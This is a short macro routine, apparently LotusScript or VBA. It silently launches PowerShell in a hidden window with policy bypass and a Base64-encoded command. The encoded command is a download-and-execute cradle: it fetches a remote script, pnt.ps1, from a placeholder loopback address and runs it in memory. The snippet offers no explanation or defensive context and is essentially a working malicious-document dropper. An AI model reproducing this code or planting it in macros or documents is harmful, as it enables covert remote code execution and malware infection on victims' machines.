    Sub Initialize()
    Set oShell = CreateObject( "WScript.Shell" )
    ps = "PowerShell -Exec Bypass -NoL -W Hidden -Enc aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB3AHcAdwAvAGwAaQBuAGsALwBwAG4AdAAuAHAAcwAxACcAKQApAA=="
    oShell.run(ps),0,true
    End Sub
